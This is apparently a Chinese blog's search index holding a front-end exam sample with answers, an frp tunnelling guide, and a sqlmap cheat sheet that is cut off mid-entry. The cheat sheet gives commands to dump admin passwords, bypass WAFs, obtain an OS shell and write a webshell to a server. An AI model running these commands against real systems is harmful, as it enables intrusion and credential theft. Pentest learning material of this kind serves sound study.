<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1+x 初级理论考试样题 2019</title>
      <link href="/posts/6426.html"/>
      <url>/posts/6426.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-X初级理论考试样题-2019"><a href="#1-X初级理论考试样题-2019" class="headerlink" title="1+X初级理论考试样题 2019"></a>1+X初级理论考试样题 2019</h1><h2 id="一、单选题（每题-2-分，共-60-分）"><a href="#一、单选题（每题-2-分，共-60-分）" class="headerlink" title="一、单选题（每题 2 分，共 60 分）"></a>一、单选题（每题 2 分，共 60 分）</h2><p>1、在 HTML 中，() 用来表示特殊字符引号 C</p><blockquote><p>A、® B、© C、” D、 </p></blockquote><p>2、下面关于文件路径的说法错误的是 B<br>A、“../” 是返回当前目录的上一级目录<br>B、“../” 是返回当前目录的下一级目录<br>C、访问下一级目录直接输入相应的目录名即可<br>D、文件路径指文件存储的位置</p><p>3、下列选项中定义标题最合理的是 C<br>A、<span class="header"> 文章标题 </span><br>B、<code>&lt;p&gt; 文章标题 &lt;/p&gt;</code><br>C、<code>&lt;h2&gt; 标题 &lt;/h2&gt;</code><br>D、<code>&lt;div&gt; 文章标题 &lt;/div&gt;</code></p><p>4、关于样式的优先级说法正确的是 C<br>A、内联样式 &gt;!important<br>B、内部样式 &gt; 外部样式 &gt;!important<br>C、!important &gt; 内联样式 &gt; 内部样式 &gt; 外部样式<br>D、以上都不正确</p><p>5、在 HTML 中，下面（ ）不属于 HTML 文档的基本组成部分。 A<br>A、<code>&lt;STYLE&gt;&lt;/STYTLE&gt;</code><br>B、<code>&lt;BODY&gt;&lt;/BODY&gt;</code><br>C、<code>&lt;HTML&gt;&lt;/HTML&gt;</code><br>D、<code>&lt;HEAD&gt;&lt;/HEAD&gt;</code></p><p>6、在 HTML 中，下列有关邮箱的链接书写正确的是 D<br>A、〈a href=”telnet:<a href="mailto:zhangming@aptech.com">zhangming@aptech.com</a>“&gt; 发送邮件<br>B、〈a href=”mail:<a href="mailto:zhangming@aptech.com">zhangming@aptech.com</a>“&gt; 发送邮件<br>C、〈a href=”ftp:<a href="mailto:zhangming@aptech.com">zhangming@aptech.com</a>“&gt; 发送邮件<br>D、〈a href=”mailto:<a href="mailto:zhangming@aptech.com">zhangming@aptech.com</a>“&gt; 发送邮件</p><p>7、在 HTML5 中，哪个属性用于规定输入字段是必填的？ B<br>A、readonly<br>B、required<br>C、validate<br>D、placeholder</p><p>8、HTML5 的正确 doctype 是 A<br>A、!DOCTYPE html<br>B、<code>&lt;!DOCTYPE HTML5&gt;</code><br>C、!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 5.0//EN” “<a href="http://www.w3.org/TR/html5/strict.dtd&quot;" target="_blank" rel="noopener">http://www.w3.org/TR/html5/strict.dtd&quot;</a><br>D、!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “<a href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;" target="_blank" rel="noopener">http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</a></p><p>9、以下说法不正确的是 A<br>A、HTML5 标准还在制定中<br>B、HTML5 兼容以前 HTML4 下浏览器<br>C、<code>&lt;canvas&gt; 标签替代 Flash</code><br>D、简化的语法</p><p>10、设定一个元素按规定的动画执行，你需要运用什么规则？ B<br>A、animation<br>B、keyframes<br>C、flash<br>D、transition</p><p>11、每段文字都需要首行缩进两个字的距离，该设置什么属性？C<br>A、text-transform<br>B、text-align<br>C、text-indent<br>D、text-decoration</p><p>12、关于 box-shadow 说法正确的是 B<br>A、设置文字投影<br>B、第一个值是设置水平距离的<br>C、第二个值是设置水平距离的<br>D、第三个值是设置投影颜色的</p><p>13、设置盒子圆角的属性是 C<br>A、box-sizing<br>B、box-shadow<br>C、border-radius<br>D、border</p><p>14、将 div 类名以 ‘c’ 开头元素添加文字为红色，书写正确的是 A<br>A、div[class^=c]{color:red}<br>B、div[class$=c]{color:red}<br>C、div[class=c]{color:red}<br>D、div[class*=c]{color:red}</p><p>15、在 HTML 中，通过 ( ) 可以实现鼠标悬停在 div 上时，元素执行旋转 45 度效果 A<br>A、div:hover{transform:rotate(45deg)}<br>B、div:hover{transform:translate(50px)}<br>C、div:hover{transform:scale(1.5)}<br>D、div:hover{transform:skew(45deg)};</p><p>16、关于 flex 说法正确的是 A<br>A、flex 属性用于指定弹性子元素如何分配空间<br>B、flex:1 应该写在弹性元素上<br>C、设置 flex:1 无意义<br>D、flex 是指设置固定定位</p><p>17、让一个动画一直执行的属性是 B<br>A、animation-direction<br>B、animation-iteration-count<br>C、animation-play-state<br>D、animation-delay</p><p>18、以下不属于 background-clip 的值的是 D<br>A、border-box<br>B、padding-box<br>C、content-box<br>D、none</p><p>19、以下哪条语句会产生运行错误 A<br>A、var obj = ();<br>B、var obj = {};<br>C、var obj = [];<br>D、var obj = //;</p><p>20、请选择结果为真的表达式 C<br>A、null instance of Object<br>B、null === undefined<br>C、null == undefined<br>D、NaN == NaN</p><p>21、下面代码输出什么？C</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584719882519.png" alt="第 21 题图"></p><p>A、16<br>B、10<br>C、12<br>D、6</p><p>22、下列表达式成立的是 D<br>A、parseInt(12.5)==parseFloat(12.5)<br>B、Number(“123abc”)==parseFloat(“123abc”)<br>C、isNaN(“abc”)==NaN<br>D、typeof NaN==”number”</p><p>23、在 JavaScript 中，执行下面的代码后，num 的值是 C</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584719907896.png" alt="第 23 题图"></p><p>A、-1</p><p>B、0</p><p>C、4</p><p>D、13</p><p>24、阅读下面的 JavaScript 代码，输出结果是 B</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584719933819.png" alt="第 24 题图"></p><p>A、0 1 2 3 4</p><p>B、 0 1 4 9 16</p><p>C、0 1 4 9 16 25</p><p>D、以上答案都不对</p><p>25、在 Java script 中，运行下面代码的结果是 A </p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584719937345.png" alt="第 25 题图"></p><p>A、undefined,18,19</p><p>B、17,18,19</p><p>C、5,18,19</p><p>D、undefined,18,18</p><p>26、下面代码输出正确的是 D</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584720009463.png" alt="第 26 题图"></p><p>A、3, 3, 3</p><p>B、3, 3, NaN</p><p>C、3, NaN, NaN</p><p>D、other</p><p>27、在以下选项中，关于 JavaScript 的 Date 对象描述正确的是 C<br>A、getDay ( ) 方法能返回 Date 对象的一个月中的一天，其值为 1<del>31<br>B、getDate ( ) 方法能返回 Date 对象的一周中的一天，其值为 0</del>6<br>C、getTime () 方法能返回某一时刻 (1970 年 1 月 1 日) 依赖的毫秒数<br>D、getYear ( ) 方法只能返回 4 位年份，长用于获取 Date 对象的年份</p><p>28、以下关于 jQuery 节点的说法中错误是 C<br>A、jQuery 中用 $(“.box”).insertBefore (ele1,ele2) 给指定 ele2 前添加 ele1 元素<br>B、jQuery 中用 $(“.box”).append (ele) 给 box 类后添加 ele 元素<br>C、jQuery 中用 $(“.box”).appendTo (ele) 给 box 类后添加 ele 元素<br>D、jQuery 中用 $(“.box”).insertAfter (ele1,ele2) 给 ele2 后添加 ele1 元素</p><p>29、在 jQuery 中，下列关于事件的说法错误的是 A<br>A、jQuery 中用 onclick 绑定点击事件<br>B、jQuery 中用 on 来给未来元素绑定事件<br>C、jQuery 中用 hover 来绑定鼠标经过事件<br>D、jQuery 中存在冒泡事件，故需要阻止冒泡</p><p>30、在 jQuery 中，能够操作 HTML 代码及其文本的方法是 C<br>A、attr()<br>B、text()<br>C、html()<br>D、val()</p><h2 id="二、多选题（每题-2-分，共-30-分）"><a href="#二、多选题（每题-2-分，共-30-分）" class="headerlink" title="二、多选题（每题 2 分，共 30 分）"></a>二、多选题（每题 2 分，共 30 分）</h2><p>1、在 JavaScript 语法中，下列说法正确的是 AB<br>A、parseInt (43.12) 返回值为 43<br>B、parseInt (‘abc43.12’) 返回值为 NaN<br>C、parseFloat (‘43.13abc’)==parseInt (43.12) 返回 true<br>D、isNaN (parseFloat (‘45.13abc’)) 返回 true</p><p>2、下面哪些是 JavaScript 中 document 的方法？ ACDE<br>A、getElementById<br>B、getElementsById<br>C、getElementsByTagName<br>D、getElementsByName<br>E、getElementsByClassName</p><p>3、关于 JavaScript 事件说法不正确的是 BCD<br>A、事件由事件函数、事件源、事件对象组成<br>B、当前事件作用在哪个标签上，哪个标签就是事件源<br>C、onclick 就是一个事件对象<br>D、图片切换使用 JavaScript 的 change 事件</p><p>4、下列关于获取页面元素说法正确的是 AC<br>A、document.getElementById (‘a’) 是通过 id 值为 a 获取页面中的一个元素<br>B、document.getElementsByName (“na”) 是通过 name 属性值为 na 获取页面中的一个元素<br>C、document.getElementsByTagName (“div”) 是通过标签名获取所有 div;<br>D、以上说法都不正确；</p><p>5、下列选项中属于 jQuery 属性选择器的是 AC<br>A、$(“img[src$=’.gif ‘]”)<br>B、$(“img”)<br>C、$(“class”)<br>D、$(“div&gt;span”)</p><p>6、网页的 <code>&lt;body&gt;</code> 元素中包含以下 HTML 代码，其中能弹出 “标题 1” 的 jQuery 代码是 AB</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584720028183.png" alt="第 6 题图"></p><p>A、alert($(‘#top1’).text());<br>B、alert($(‘[name=header1]’).text());<br>C、alert($(‘[name=’header1’]’).text());<br>D、alert($(‘#header1’).text());</p><p>7、以下（ ）是块级元素 AD<br>A、div<br>B、img<br>C、input<br>D、p</p><p>8、以下标签书写正确的是 BCD<br>A、<p/><br>B、<br/><br>C、<hr/><br>D、<img/></p><p>9、嵌入在 HTML 文档中的图像格式可以是 ACD<br>A、<em>.gif<br>B、</em>.tif<br>C、<em>.bmp<br>D、</em>.jpg</p><p>10、请选出正确的选项<br>A、属性要在开始标签中指定，用来表示该标签的性质和特性 ABCD<br>B、通常都是以 “属性名 =“值”” 的形式来表示<br>C、一个标签可以指定多个属性<br>D、指定多个属性时不用区分顺序</p><p>11、下面哪些是 HTML5 新增的表单元素？ AC<br>A、datalist<br>B、optgroup<br>C、output<br>D、legend</p><p>12、关于 media 说法正确的是 ABCD<br>A、@media 查询，你可以针对不同的媒体类型定义不同的样式<br>B、@media 可以设计响应式页面<br>C、当你重置浏览器大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面<br>D、可以用 media 属性在 link 中使用</p><p>13、文字溢出显示省略号应该拥有那些属性？ABCD<br>A、overflow: hidden;<br>B、white-space: nowrap;<br>C、text-overflow: ellipsis;<br>D、width:500px</p><p>14、关于语义化说法不正确的是 ABC<br>A、语义化的 HTML 有利于机器的阅读<br>B、Table 属于过时的标签，遇到数据列表时，需尽量使用 div 来模拟表格<br>C、语义化是 HTML5 带来的新概念，此前版本的 HTML 无法做到语义化<br>D、Header、article、address 都属于语义化明确的标签</p><p>15、background-origin 的值有哪些？BCD<br>A、none<br>B、border-box<br>C、content-box<br>D、padding-box</p><h2 id="三、判断题（每小题-2-分，共-10-分）"><a href="#三、判断题（每小题-2-分，共-10-分）" class="headerlink" title="三、判断题（每小题 2 分，共 10 分）"></a>三、判断题（每小题 2 分，共 10 分）</h2><p>1、H5 就是 HTML5 的简称。 ×<br>√ ×<br>2、CSS Sprites 整理起来更为方便，同一个按钮不同状态的图片也需要一个个切割出来并个别命名。 ×<br>√ ×<br>3、slideUp () 方法通过高度变化（向上减小）来动态地隐藏所有匹配的元素。 √<br>√ ×<br>4、在 jquery 中 addClass () 可以增加多个样式，各个样式间用：隔开。 ×<br>√ ×<br>5、padding:10px; 只设置上边填充为 10 像素，其它三边为零像素。 ×<br>√ ×</p>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> jquery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目标网站渗透思路</title>
      <link href="/posts/59d.html"/>
      <url>/posts/59d.html</url>
      
        <content type="html"><![CDATA[<p>水一波~~<br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E6%8C%87%E5%AE%9A%E7%9B%AE%E6%A0%87%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.jpg" alt="指定目标渗透思路"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用frp提高开发效率</title>
      <link href="/posts/ed0.html"/>
      <url>/posts/ed0.html</url>
      
        <content type="html"><![CDATA[<h1 id="阿里云实现-frp-内网穿透"><a href="#阿里云实现-frp-内网穿透" class="headerlink" title="阿里云实现 frp 内网穿透"></a>阿里云实现 frp 内网穿透</h1><p>服务器：centos<br>客户机：Windows</p><p><strong>在阿里云控制面板上要将安全组全部放行！！！</strong><br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582906955637.png" alt="enter description here"></p><p><strong>如果使用了宝塔，也要将宝塔安全中的配置放行</strong><br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907033904.png" alt="enter description here"></p><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>下载地址<br><a href="https://github.com/fatedier/frp/releases/" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/</a></p><p><strong>注意服务器和客户机的版本要一样</strong></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="服务器上的配置"><a href="#服务器上的配置" class="headerlink" title="服务器上的配置"></a>服务器上的配置</h3><p>在服务器上我们使用的是frps 不用去修改frpc的文件，当然你有这个需求的话可以去修改<br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907307135.png" alt="enter description here"></p><h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><p><code>vim frps.ini</code></p><pre><code>[common]bind_port = 7000 #你要放行分配客户机使用的端口</code></pre><h4 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h4><p><code>./frps -c frps.ini</code></p><pre class=" language-shell"><code class="language-shell">2020/02/28 23:58:35 [I] [service.go:146] frps tcp listen on 0.0.0.0:70002020/02/28 23:58:35 [I] [root.go:204] Start frps success</code></pre><p><strong>如果出现以上信息代表服务器端frps配置完毕并且开启成功</strong></p><h3 id="客户机上配置"><a href="#客户机上配置" class="headerlink" title="客户机上配置"></a>客户机上配置</h3><p><strong>Windows</strong><br>打开解压之后会有以下文件<br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907307135.png" alt="enter description here"></p><p>这里我们用到的是frpc配置</p><h4 id="修改客户机配置"><a href="#修改客户机配置" class="headerlink" title="修改客户机配置"></a>修改客户机配置</h4><p><code>frpc.ini</code></p><pre class=" language-ini"><code class="language-ini"><span class="token selector">[common]</span><span class="token constant">server_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> xxx.xxx.xxx.xxx   #frp服务端地址，必须是公网ip或者域名</span><span class="token constant">server_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000      #frp服务端端口，即填写服务端配置中的 bind_port</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp              #连接类型，填tcp或udp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1    #填127.0.0.1或内网ip都可以</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22         #需要转发到的端口，ssh端口是22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 6000      #frp服务端的远程监听端口，即你访问服务端的remote_port就相当于访</span>                        #问客户端的 local_port，如果填0则会随机分配一个端口</code></pre><h4 id="运行客户机进行连接"><a href="#运行客户机进行连接" class="headerlink" title="运行客户机进行连接"></a>运行客户机进行连接</h4><p>在frp的文件目录下打开cmd<br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907892866.png" alt="enter description here"></p><p><strong>以上信息代表成功可以访问frpc.ini中的remote_port所填端口进行访问</strong></p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
            <tag> 技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap简单使用</title>
      <link href="/posts/74fc.html"/>
      <url>/posts/74fc.html</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><strong>POST登录框注入：</strong> </p><p><strong>抓包，然后保存抓取到的内容。例如：保存为post.txt,然后把它放至某个目录下</strong> </p><p>sqlmap.py -r 从文件读取数据 -p 指定的参数 –tables</p><p>sqlmap.py -r search-test.txt -p tfUPass </p><p>注：-r表示加载一个文件，-p指定参数 </p><p>sqlmap.py -u 登录的地址 –forms 自动判断注入</p><h4 id="指定参数搜索注入"><a href="#指定参数搜索注入" class="headerlink" title="指定参数搜索注入"></a>指定参数搜索注入</h4><p>sqlmap.py -u 登录的地址 –data “指定参数”</p><p>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url]" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp[/url]</a> –data “tfUName=321&amp;tfUPass=321”</p><h4 id="自动注册表单，截取数据。-直接在后面加-–forms"><a href="#自动注册表单，截取数据。-直接在后面加-–forms" class="headerlink" title="自动注册表单，截取数据。(直接在后面加[–forms])"></a>自动注册表单，截取数据。(直接在后面加[–forms])</h4><p>sqlmap -u “<a href="http://www.xx.com/Login.asp&quot;" target="_blank" rel="noopener">http://www.xx.com/Login.asp&quot;</a> –forms</p><p><strong>自动搜索表单的方式</strong></p><p>sqlmap.py -u “<a href="http://192.168.160.1/sqltest/post.php&quot;" target="_blank" rel="noopener">http://192.168.160.1/sqltest/post.php&quot;</a> –forms </p><h4 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h4><p>sqlmap.py -u “<a href="http://www.xx.com/Login.asp&quot;" target="_blank" rel="noopener">http://www.xx.com/Login.asp&quot;</a> –data “标签名1=数据1&amp;标签名2=数据2&amp;标签名3=数据3…” </p><p>注：填写的数据可以随意写，但标签名一定要与input标签中的name一致，不同的标签名对应不同的name</p><p>sqlmap -u “<a href="http://www.xx.com/Login.asp&quot;" target="_blank" rel="noopener">http://www.xx.com/Login.asp&quot;</a> –data “Username=1&amp;Password=1”</p><p>注：Username与Password分别为Login.asp页面中的两个输入框的名字，将鼠标移动到输入框上面右击选择“审查元素”即可看到，每台网页的Login页面都不一定是一样的</p><h4 id="COOKIE提交"><a href="#COOKIE提交" class="headerlink" title="COOKIE提交"></a>COOKIE提交</h4><p><strong>指定一个参数的方法</strong> </p><p>sqlmap -u <a href="http://xxx.xxx.com/Login.asp" target="_blank" rel="noopener">http://xxx.xxx.com/Login.asp</a> –data “n=1&amp;p=1” </p><p>python sqlmap.py -u “url” –cookie “id=1” -v 1</p><h6 id="cookie注入，猜解表"><a href="#cookie注入，猜解表" class="headerlink" title="cookie注入，猜解表"></a>cookie注入，猜解表</h6><p>判断数据库，获取服务器，网站环境等参数 </p><p>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp&quot;" target="_blank" rel="noopener">http://192.168.87.129/shownews.asp&quot;</a> –cookie “id=27<strong>“ –table –level 2</strong> </p><h5 id="猜解字段，-通过1的表猜解字段，假如表为admin"><a href="#猜解字段，-通过1的表猜解字段，假如表为admin" class="headerlink" title="猜解字段，(通过1的表猜解字段，假如表为admin)"></a>猜解字段，(通过1的表猜解字段，假如表为admin)</h5><p>sqlmap.py -u <a href="http://www.xx.com/show.asp" target="_blank" rel="noopener">http://www.xx.com/show.asp</a> –cookie “id=187” –columns -T 数据表 –level 2 </p><p>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp&quot;" target="_blank" rel="noopener">http://192.168.87.129/shownews.asp&quot;</a> –cookie “id=27” –columns -T admin –level 2</p><h4 id="猜解内容"><a href="#猜解内容" class="headerlink" title="猜解内容"></a>猜解内容</h4><p>sqlmap.py -u <a href="http://www.xx.com/show.asp" target="_blank" rel="noopener">http://www.xx.com/show.asp</a> –cookie “id=187” –dump -T 表名 -C “字段名1,字段名2”  –level 2 </p><p><strong>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp&quot;" target="_blank" rel="noopener">http://192.168.87.129/shownews.asp&quot;</a> –cookie “id=27” –dump -T admin -C “user,password” –level 2</strong> </p><h4 id="SQLMAP中的请求延迟"><a href="#SQLMAP中的请求延迟" class="headerlink" title="SQLMAP中的请求延迟"></a>SQLMAP中的请求延迟</h4><p>参数 –delay –safe-freq </p><p>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –safe-freq 3</p><h4 id="使用多线程猜解"><a href="#使用多线程猜解" class="headerlink" title="使用多线程猜解"></a>使用多线程猜解</h4><p>python sqlmap.py -u “url” -v 1 –current-user –threads 3</p><h4 id="指定数据库，绕过SQLMAP的自动检测"><a href="#指定数据库，绕过SQLMAP的自动检测" class="headerlink" title="指定数据库，绕过SQLMAP的自动检测"></a>指定数据库，绕过SQLMAP的自动检测</h4><p>python sqlmap.py -u “url” -v 2 –dbms “PostgreSQL”</p><h4 id="指定操作系统绕过SQLMAP自动检测"><a href="#指定操作系统绕过SQLMAP自动检测" class="headerlink" title="指定操作系统绕过SQLMAP自动检测"></a>指定操作系统绕过SQLMAP自动检测</h4><p>python sqlmap.py -u “url” -v 2 –os “Windows”</p><h4 id="union注入测试"><a href="#union注入测试" class="headerlink" title="union注入测试"></a>union注入测试</h4><p>python sqlmap.py -u “url” –union-test -v -1</p><h4 id="绕过waf防火墙："><a href="#绕过waf防火墙：" class="headerlink" title="绕过waf防火墙："></a>绕过waf防火墙：</h4><p>sqlmap.py -u 注入点 -v 3 –dbs –batch –tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py </p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> -v 3 –dbs –batch –tamper “space2morehash.py”</p><h4 id="SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h4><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –sql-shell</p><p>-u #注入点<br>-g 谷歌搜索<br>-f #指纹判别数据库类型<br>-b #获取数据库版本信息<br>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)<br>-D “” #指定数据库名<br>-T “” #指定表名<br>-C “” #指定字段<br>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)<br>–columns #列出字段<br>–current-user #获取当前用户名称<br>–current-db #获取当前数据库名称<br>–users #列数据库所有用户<br>–passwords #数据库用户所有密码<br>–privileges #查看用户权限(–privileges -U root)<br>-U #指定数据库用户<br>–dbs #列出所有数据库<br>–tables -D “” #列出指定数据库中的表<br>–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段<br>–dump-all #列出所有数据库所有表<br>–exclude-sysdbs #只列出用户自己新建的数据库和表<br>–dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)<br>–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据<br>–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)<br>–os #指定系统(Linux,Windows)<br>–sql -shell 写shell<br>–delay 延迟的时间<br>–safe-freq 次数<br>-v #详细的等级(0-6)：<br>0：只显示Python的回溯，错误和关键消息。<br>1：显示信息和警告消息。<br>2：显示调试消息。<br>3：有效载荷注入。<br>4：显示HTTP请求。<br>5：显示HTTP响应头</p><p>6：显示HTTP响应页面的内容</p><h4 id="SQLMAP注入点执行命令与交互写shell"><a href="#SQLMAP注入点执行命令与交互写shell" class="headerlink" title="SQLMAP注入点执行命令与交互写shell"></a>SQLMAP注入点执行命令与交互写shell</h4><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –os-cmd=ipconfig</p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –os-shell</p><h4 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h4><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p> –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><h4 id="SQLMAP用于mysql注入"><a href="#SQLMAP用于mysql注入" class="headerlink" title="SQLMAP用于mysql注入"></a>SQLMAP用于mysql注入</h4><p>1) 查找数据库 </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> –dbs</p><p>2) 通过第一步的数据库查找表(假如数据库名为dataname) </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname –tables</p><p>3) 通过2中的表得出列名(假如表为table_name) </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name –columns</p><p>4) 获取字段的值(假如扫描出id,user,password字段) </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name -C<br>“id,user,password” –dump</p><h4 id="简单的注入流程"><a href="#简单的注入流程" class="headerlink" title="简单的注入流程"></a>简单的注入流程</h4><h5 id="1-读取数据库版本，当前用户，当前数据库"><a href="#1-读取数据库版本，当前用户，当前数据库" class="headerlink" title="1.读取数据库版本，当前用户，当前数据库"></a>1.读取数据库版本，当前用户，当前数据库</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 -f -b –current-user –current-db -v 1</p><h5 id="2-判断当前数据库用户权限"><a href="#2-判断当前数据库用户权限" class="headerlink" title="2.判断当前数据库用户权限"></a>2.判断当前数据库用户权限</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –privileges -U 用户名 -v 1<br>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –is-dba -U 用户名 -v 1</p><h5 id="3-读取所有数据库用户或指定数据库用户的密码"><a href="#3-读取所有数据库用户或指定数据库用户的密码" class="headerlink" title="3.读取所有数据库用户或指定数据库用户的密码"></a>3.读取所有数据库用户或指定数据库用户的密码</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –users –passwords -v 2<br>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –passwords -U root -v 2</p><h5 id="4-获取所有数据库"><a href="#4-获取所有数据库" class="headerlink" title="4.获取所有数据库"></a>4.获取所有数据库</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –dbs -v 2</p><h5 id="5-获取指定数据库中的所有表"><a href="#5-获取指定数据库中的所有表" class="headerlink" title="5.获取指定数据库中的所有表"></a>5.获取指定数据库中的所有表</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –tables -D mysql -v 2</p><h5 id="6-获取指定数据库名中指定表的字段"><a href="#6-获取指定数据库名中指定表的字段" class="headerlink" title="6.获取指定数据库名中指定表的字段"></a>6.获取指定数据库名中指定表的字段</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –columns -D mysql -T users -v 2</p><h5 id="7-获取指定数据库名中指定表中指定字段的数据"><a href="#7-获取指定数据库名中指定表中指定字段的数据" class="headerlink" title="7.获取指定数据库名中指定表中指定字段的数据"></a>7.获取指定数据库名中指定表中指定字段的数据</h5><p>sqlmap -u <a 